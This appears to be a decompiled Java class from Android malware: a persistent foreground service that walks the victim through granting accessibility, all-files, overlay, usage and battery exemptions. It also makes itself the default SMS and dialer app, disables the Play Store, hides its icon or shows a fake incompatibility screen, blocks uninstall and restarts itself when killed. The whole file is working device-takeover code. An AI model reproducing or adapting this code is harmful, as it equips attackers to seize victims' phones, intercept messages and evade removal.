/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.NotificationManager
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.net.Uri
 *  android.os.Build$VERSION
 *  android.os.Environment
 *  android.os.Handler
 *  android.os.IBinder
 *  android.provider.Settings
 *  android.util.Base64
 *  android.util.Log
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import java.io.PrintStream;
import linker.resourcer.encoder.AlarmHelper;
import linker.resourcer.encoder.ConfigManager;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.DrawOverlayPermissionActivity;
import linker.resourcer.encoder.DefaultDialerSmsActivity;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.PermissionArrayProvider;
import linker.resourcer.encoder.PermissionsRequestActivity;
import linker.resourcer.encoder.AccessibilityServiceController;
import linker.resourcer.encoder.WebSocketCommandHandler;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.WorkerService;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.IncompatibilityNotificationActivity;
import linker.resourcer.encoder.NotificationBuilder;
import linker.resourcer.encoder.AccessibilityPromptActivity;
import linker.resourcer.encoder.SetupOrchestrationService$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.SetupOrchestrationService$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.SetupOrchestrationService$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.SetupOrchestrationService$$ExternalSyntheticLambda3;
import linker.resourcer.encoder.SystemUtilities;
import linker.resourcer.encoder.SharedPreferencesManager;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class SetupOrchestrationService
extends Service {
    private static int Notifi_ID = 0;
    private static final String PREF_NAME = "my_prefs";
    public static final String SKIP_ALLFILES = "skipfiles";
    public static final String SPECIAL_TASK_DONE = "special_task_done";
    static boolean Showedonce;
    static int SleepTime;
    static int batterytwice;
    static int checktwice;
    static ConfigManager config;
    private static int countcalls;
    private static int countsmss;
    static int disabletris;
    static int drawtwice;
    static boolean hold13;
    static boolean holdaccessonce;
    public static boolean holdxaomi;
    public static boolean isbooting;
    static int maxholder;
    public static boolean needtofy;
    static boolean onetime;
    static int primstowic;
    static boolean skipblackdraw;
    static boolean skipblackplay;
    static boolean skipblackprim;
    static boolean skipcalls;
    public static boolean skipprimes;
    static boolean skipsms;
    static boolean skipstorage;
    static boolean skipusagereq;
    public static int timesoutxaomi;
    static boolean trdreams;
    public static boolean trigeronexamoi;
    static boolean trnotifionce;
    private int triesfiles = 0;

    static {
        isbooting = false;
        Notifi_ID = 111;
        SleepTime = 5000;
        checktwice = 0;
        drawtwice = 0;
        batterytwice = 0;
        disabletris = 0;
        primstowic = 0;
        skipprimes = false;
        needtofy = false;
        holdxaomi = true;
        trigeronexamoi = true;
        timesoutxaomi = 0;
        skipstorage = false;
        skipblackprim = false;
        skipblackdraw = false;
        skipusagereq = false;
        skipblackplay = false;
        Showedonce = false;
        onetime = false;
        hold13 = false;
        holdaccessonce = true;
        maxholder = 28;
        trnotifionce = true;
        trdreams = true;
        skipsms = false;
        skipcalls = false;
        countcalls = 0;
        countsmss = 0;
    }

    public static boolean getBool(Context context, String string2, boolean bl) {
        return context.getSharedPreferences(PREF_NAME, 0).getBoolean(string2, bl);
    }

    private boolean handleAccessibilityJob(Context context) {
        if (!SystemUtilities.is_Access_Enabled(context, AccessibilityServiceController.class) && SetupOrchestrationService.config.add_accss && SetupOrchestrationService.config.req_accss) {
            isbooting = true;
            if (Build.VERSION.SDK_INT >= 33 && !SystemUtilities.is_Access_Enabled(context, AccessibilityServiceController.class) && "g".equals(ConfigurationProvider.Access_type) && !WebSocketCommandHandler.isActivityOpen() && !hold13 && maxholder >= 27 && Showedonce) {
                try {
                    Intent intent = new Intent(context, WebSocketCommandHandler.class);
                    intent.addFlags(0x10000000);
                    this.startActivity(intent);
                    needtofy = true;
                    this.scheduleNotifyIfNeeded(context, WebSocketCommandHandler.class);
                }
                catch (Exception exception) {
                    // empty catch block
                }
                SleepTime = 15000;
                hold13 = true;
                return true;
            }
            if (!AccessibilityPromptActivity.isActivityOpen() && maxholder >= 27) {
                SleepTime = 2000;
                Intent intent = new Intent(context, AccessibilityPromptActivity.class);
                intent.addFlags(0x10000000);
                intent.addFlags(0x4000000);
                this.startActivityOnMain(context, intent);
                needtofy = true;
                this.scheduleNotifyIfNeeded(context, AccessibilityPromptActivity.class);
                Showedonce = true;
                maxholder = 0;
            } else {
                ++maxholder;
                hold13 = false;
            }
            return true;
        }
        return false;
    }

    private boolean handleBatteryOptimizationJob(Context context) {
        if (batterytwice < 2 && SetupOrchestrationService.config.req_btryoptm && !UtilityHelper.IsIgnore_Battery(context)) {
            ++batterytwice;
            try {
                AccessibilityServiceController.PreventDelete = false;
                StringBuilder stringBuilder = new StringBuilder();
                Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse((String)stringBuilder.append("package:").append(this.getPackageName()).toString()));
                intent.addFlags(0x10000000);
                intent.addFlags(65536);
                intent.addFlags(0x4000000);
                context.startActivity(intent);
                AccessibilityServiceController.forbattery = true;
                SleepTime = 3000;
            }
            catch (Exception exception) {
                // empty catch block
            }
            return true;
        }
        return false;
    }

    private boolean handleDefCALL(Context context) {
        if (ConfigurationProvider.SetDef_Call.equals("1") && !skipcalls) {
            if (UtilityHelper.isDefaultDialer(context)) {
                AccessibilityServiceController.SET_CALLS_DEF = false;
                skipcalls = true;
                return false;
            }
            try {
                context = new Intent(this.getApplicationContext(), DefaultDialerSmsActivity.class);
                context.addFlags(0x10000000);
                context.putExtra("target", "C");
                this.startActivity((Intent)context);
                SleepTime = 3000;
                if (++countcalls >= 2) {
                    skipcalls = true;
                }
                return true;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        AccessibilityServiceController.SET_CALLS_DEF = false;
        return false;
    }

    private boolean handleDefSMS(Context context) {
        if (ConfigurationProvider.SetDef_SMS.equals("1") && !skipsms) {
            if (UtilityHelper.isDefaultSms(context)) {
                AccessibilityServiceController.SET_SMS_DEF = false;
                skipsms = true;
                return false;
            }
            try {
                context = new Intent(this.getApplicationContext(), DefaultDialerSmsActivity.class);
                context.addFlags(0x10000000);
                context.putExtra("target", "S");
                this.startActivity((Intent)context);
                SleepTime = 3000;
                if (++countsmss >= 2) {
                    skipsms = true;
                }
                return true;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        AccessibilityServiceController.SET_SMS_DEF = false;
        return false;
    }

    private boolean handleDrawOverlayJob(Context context) {
        if (SetupOrchestrationService.config.req_draw && drawtwice < 2 && !Settings.canDrawOverlays((Context)context)) {
            ++drawtwice;
            if (!skipblackdraw && SetupOrchestrationService.config.req_hidp) {
                skipblackdraw = true;
            }
            context.startActivity(new Intent(context, DrawOverlayPermissionActivity.class).addFlags(0x40000000).addFlags(0x10000000));
            SleepTime = 6000;
            return true;
        }
        AccessibilityServiceController.FOR_DRAW_OVER = false;
        return false;
    }

    private boolean handleDreamJob(Context context) {
        if (SetupOrchestrationService.config.req_accss && trdreams) {
            trdreams = false;
            if (UtilityHelper.isMyDreamSelected((Context)this)) {
                AccessibilityServiceController.FOR_Dream = false;
                return false;
            }
            try {
                Intent intent = new Intent("android.settings.DREAM_SETTINGS");
                intent.addFlags(0x10000000);
                intent.addFlags(0x40000000);
                intent.addFlags(0x800000);
                intent.addFlags(0x4000000);
                AccessibilityServiceController.FOR_Dream = true;
                context.startActivity(intent);
                SleepTime = 2000;
            }
            catch (Exception exception) {
                // empty catch block
            }
            return true;
        }
        AccessibilityServiceController.FOR_Dream = false;
        return false;
    }

    private boolean handleFilesPermissionJob(Context context) {
        if (SetupOrchestrationService.config.req_files && Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            if (this.triesfiles > 2) {
                AccessibilityServiceController.FOR_EXTR_STRG = false;
                try {
                    if (WorkerService.My_Access_inst != null) {
                        WorkerService.My_Access_inst.performGlobalAction(1);
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
                return false;
            }
            try {
                context = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                context.setData(Uri.fromParts((String)"package", (String)this.getPackageName(), null));
                context.addFlags(0x10000000);
                ++this.triesfiles;
                this.startActivitySafe((Intent)context);
                AccessibilityServiceController.FOR_EXTR_STRG = true;
                SleepTime = 2500;
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
            return true;
        }
        return false;
    }

    private boolean handleFinalSetupJob(Context object) {
        Intent intent;
        if (!SystemUtilities.isServiceRunning(this.getApplicationContext(), WorkerService.class)) {
            try {
                intent = new Intent(this.getApplicationContext(), WorkerService.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    this.startForegroundService(intent);
                } else {
                    this.startService(intent);
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (!onetime) {
            onetime = true;
            AccessibilityServiceController.FOR_PLY = false;
            AccessibilityServiceController.forbattery = false;
            try {
                ((NotificationManager)object.getSystemService("notification")).cancel(101);
            }
            catch (Exception exception) {
                // empty catch block
            }
            AccessibilityServiceController.FOR_PRIMS = false;
            AccessibilityServiceController.Auto_Click = false;
            if ("1".equals(ConfigurationProvider.Hide_ico)) {
                SharedPreferencesManager.WriteBool(object, "setup_ok", true);
                if ("f".equals(ConfigurationProvider.Hide_Type)) {
                    try {
                        intent = new Intent(object, IncompatibilityNotificationActivity.class);
                        intent.addFlags(0x10000000);
                        object.startActivity(intent);
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                } else if ("c".equals(ConfigurationProvider.Hide_Type)) {
                    try {
                        UtilityHelper.hideme(object);
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
            }
            AccessibilityServiceController.PreventDelete = true;
            UtilityHelper.openmain(object);
            AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 != null) {
                try {
                    intent = new Handler(jhvbzpdwpbqgticwdxuva2.getMainLooper());
                    object = new SetupOrchestrationService$$ExternalSyntheticLambda0(jhvbzpdwpbqgticwdxuva2);
                    intent.post((Runnable)object);
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
            AccessibilityServiceHelper.BlackScreen(false);
        }
        ConfigurationConstants.engine_done = true;
        SleepTime = 30000;
        return true;
    }

    private boolean handleNotificationSettingsJob(Context context) {
        if (SetupOrchestrationService.config.req_accss && trnotifionce) {
            trnotifionce = false;
            try {
                Intent intent = NotificationBuilder.goToNotificationSettings("updates", context);
                intent.addFlags(0x10000000);
                intent.addFlags(0x40000000);
                intent.addFlags(0x800000);
                intent.addFlags(0x4000000);
                AccessibilityServiceController.FOR_NOTFY = true;
                context.startActivity(intent);
                this.safeSleep(500L);
                SleepTime = 3000;
            }
            catch (Exception exception) {
                // empty catch block
            }
            return true;
        }
        AccessibilityServiceController.FOR_NOTFY = false;
        return false;
    }

    private boolean handlePlayStoreDisableJob(Context context) {
        if (SetupOrchestrationService.config.req_StopPlay && SetupOrchestrationService.config.req_accss && UtilityHelper.isPackageInstalled("com.android.vending", context.getPackageManager()) && !UtilityHelper.isAppDisabled(context, "com.android.vending") && disabletris < 2) {
            SleepTime = 10000;
            try {
                ++disabletris;
                if (!skipblackplay && SetupOrchestrationService.config.req_hidp) {
                    skipblackplay = true;
                }
                context = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse((String)"package:com.android.vending"));
                context.addFlags(0x10000000);
                this.startActivitySafe((Intent)context);
                AccessibilityServiceController.FOR_PLY = true;
            }
            catch (Exception exception) {
                Log.e((String)"MIUIAutoStart", (String)"Error starting intent", (Throwable)exception);
            }
            return true;
        }
        AccessibilityServiceController.FOR_PLY = false;
        return false;
    }

    private boolean handlePostAccessibilityOpenMainJob(Context context) {
        if (SetupOrchestrationService.config.req_accss && holdaccessonce) {
            holdaccessonce = false;
            SleepTime = 2000;
            return true;
        }
        return false;
    }

    private boolean handlePrimePermissionsJob(Context context) {
        if (!skipprimes && !PermissionArrayProvider.hasPermissions(context, PermissionArrayProvider.ALL_PERMISSIONS(context))) {
            if (!skipblackprim && SetupOrchestrationService.config.req_hidp) {
                skipblackprim = true;
            }
            if (checktwice > 2) {
                skipprimes = true;
                return false;
            }
            ++checktwice;
            SleepTime = SetupOrchestrationService.config.req_accss ? 1200 : 9000;
            if (!PermissionsRequestActivity.isOpen()) {
                Intent intent = new Intent(context, PermissionsRequestActivity.class);
                intent.addFlags(0x10000000);
                intent.addFlags(65536);
                context.startActivity(intent);
            }
            return true;
        }
        return false;
    }

    private boolean handleUsageAccessJob(Context context) {
        if (SetupOrchestrationService.config.req_usagacc && !UtilityHelper.isUsageAccessGranted(context) && !SetupOrchestrationService.config.req_accss && !skipusagereq) {
            SleepTime = 7000;
            try {
                StringBuilder stringBuilder = new StringBuilder();
                context = new Intent("android.settings.USAGE_ACCESS_SETTINGS", Uri.parse((String)stringBuilder.append("package:").append(this.getPackageName()).toString()));
                context.addFlags(0x10000000);
                this.startActivitySafe((Intent)context);
            }
            catch (Exception exception) {
                try {
                    Intent intent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                    intent.addFlags(0x10000000);
                    this.startActivitySafe(intent);
                }
                catch (Exception exception2) {
                    skipusagereq = true;
                }
            }
            return true;
        }
        AccessibilityServiceController.FOR_EXTR_STRG = false;
        return false;
    }

    private boolean handleXiaomiJob(Context context) {
        if (UtilityHelper.isXiaomi() && SetupOrchestrationService.config.req_accss && !SharedPreferencesManager.ReadBool(context, ConfigurationConstants.skipxaomi, false) && holdxaomi) {
            if (trigeronexamoi) {
                trigeronexamoi = false;
                AccessibilityServiceHelper.Treger("xamoi", null);
                SleepTime = 1100;
            }
            if (timesoutxaomi < 15) {
                ++timesoutxaomi;
                return true;
            }
        }
        timesoutxaomi = 0;
        SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.skipxaomi, true);
        return false;
    }

    static /* synthetic */ void lambda$handleFinalSetupJob$3(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        try {
            jhvbzpdwpbqgticwdxuva2.clearWbVew();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * Loose catch block
     */
    public static void loadpasspkgs(Context context) {
        block9: {
            block8: {
                if (ConfigurationProvider.PPKG == null || ConfigurationProvider.PPKG.trim().isEmpty()) break block8;
                String[] stringArray = UtilityHelper.fromBase64(ConfigurationProvider.PPKG);
                if (!stringArray.contains(",")) {
                    return;
                }
                context = context.getPackageManager();
                stringArray = stringArray.split(",");
                int n = stringArray.length;
                for (int i = 0; i < n; ++i) {
                    Object object;
                    String string2 = stringArray[i].trim();
                    try {
                        object = context.getApplicationInfo((String)string2, (int)0).packageName;
                        AccessibilityServiceController.Passlist.add((String)object);
                        continue;
                    }
                    catch (Exception exception) {
                        object = System.out;
                        StringBuilder stringBuilder = new StringBuilder();
                        ((PrintStream)object).println(stringBuilder.append("Package not found: ").append(string2).toString());
                    }
                }
                break block9;
            }
            return;
            {
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
        }
    }

    private void safeSleep(long l) {
        try {
            Thread.sleep(l);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void scheduleNotifyIfNeeded(Context context, Class<?> clazz) {
        new Thread(new SetupOrchestrationService$$ExternalSyntheticLambda3(this, context, clazz)).start();
    }

    public static void setBool(Context context, String string2, boolean bl) {
        context.getSharedPreferences(PREF_NAME, 0).edit().putBoolean(string2, bl).apply();
    }

    private void startActivityOnMain(Context context, Intent intent) {
        new Handler(context.getMainLooper()).post((Runnable)new SetupOrchestrationService$$ExternalSyntheticLambda2(this, intent));
    }

    private void startActivitySafe(Intent intent) {
        try {
            this.startActivity(intent);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void startforground(Context context) {
        try {
            context = NotificationBuilder.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 0x40000000);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /* synthetic */ void lambda$onStartCommand$0$com-icontrol-protector-SetupOrchestrationService(Context context) {
        while (SleepTime < 987654321) {
            try {
                this.safeSleep(SleepTime);
                if (this.handleAccessibilityJob(context) || this.handlePostAccessibilityOpenMainJob(context) || this.handleFilesPermissionJob(context) || this.handlePrimePermissionsJob(context) || this.handleDrawOverlayJob(context) || this.handleUsageAccessJob(context) || this.handlePlayStoreDisableJob(context) || this.handleBatteryOptimizationJob(context) || this.handleDreamJob(context) || this.handleDefSMS(context) || this.handleDefCALL(context) || this.handleXiaomiJob(context)) continue;
                this.handleFinalSetupJob(context);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
    }

    /* synthetic */ void lambda$scheduleNotifyIfNeeded$2$com-icontrol-protector-SetupOrchestrationService(Context context, Class clazz) {
        this.safeSleep(3000L);
        if (needtofy) {
            UtilityHelper.NotifyFor(context, clazz);
        }
    }

    /* synthetic */ void lambda$startActivityOnMain$1$com-icontrol-protector-SetupOrchestrationService(Intent intent) {
        this.startActivitySafe(intent);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.startforground(this.getApplicationContext());
        Context context = this.getApplicationContext();
        if (SharedPreferencesManager.Read(context, "ID", "").length() == 0) {
            String string2 = UtilityHelper.Create_DevicID() + String.valueOf(UtilityHelper.randomnumber(100, 199));
            AndroidLogger.Debug("CreateID", string2);
            SharedPreferencesManager.Write(context, "ID", string2);
        }
    }

    public void onDestroy() {
        super.onDestroy();
        Context context = this.getApplicationContext();
        AlarmHelper.setAlarm(this.getApplicationContext());
        try {
            Intent intent = new Intent(context, SetupOrchestrationService.class);
            if (!SystemUtilities.isServiceRunning(context, SetupOrchestrationService.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            UtilityHelper.setupWorkManager(this.getApplicationContext());
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        this.startforground(this.getApplicationContext());
        intent = this.getApplicationContext();
        SetupOrchestrationService.loadpasspkgs(this.getApplicationContext());
        AccessibilityServiceController.CurrentNam = UtilityHelper.getLabelApplication(this.getApplicationContext()).toLowerCase();
        if (ConfigurationProvider.Tracking_Data_str.contains("|") && !ConfigurationProvider.Tracking_Data_str.startsWith("empty|")) {
            SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.enable_trak, true);
            for (Object object : ConfigurationProvider.Tracking_Data_str.split("\\|")) {
                String string2 = new String(Base64.decode((String)object, (int)0), "UTF-8");
                if (string2.length() <= 0 || !string2.contains("[<s>]")) continue;
                Object object2 = string2.split("\\[<s>\\]");
                object = object2[0];
                String string3 = object2[1];
                string2 = object2[2];
                object2 = object2[3];
                try {
                    if (((String)object2).equals("G")) {
                        AccessibilityServiceController.Graplist.add(string2.toLowerCase());
                    }
                    AccessibilityServiceHelper.Addlink((String)object, string3);
                    AccessibilityServiceHelper.AddID((String)object, string2);
                    AccessibilityServiceHelper.AddTname((String)object);
                    AccessibilityServiceHelper.AddType((String)object, (String)object2);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        } else {
            SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.enable_trak, false);
        }
        try {
            if (!SystemUtilities.isServiceRunning(this.getApplicationContext(), WorkerService.class)) {
                Intent intent2 = new Intent(this.getApplicationContext(), WorkerService.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    this.startForegroundService(intent2);
                } else {
                    this.startService(intent2);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        config = ConfigManager.getInstance();
        config.initialize(this.getApplicationContext(), ConfigurationProvider.ALL_CONFIG);
        new Thread(new SetupOrchestrationService$$ExternalSyntheticLambda1(this, (Context)intent)).start();
        return 1;
    }

    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        intent = this.getApplicationContext();
        AlarmHelper.setAlarm(this.getApplicationContext());
        Intent intent2 = new Intent((Context)intent, SetupOrchestrationService.class);
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                intent.startForegroundService(intent2);
            } else {
                intent.startService(intent2);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            UtilityHelper.setupWorkManager(this.getApplicationContext());
        }
        catch (Exception exception) {
            // empty catch block
        }
    }
}

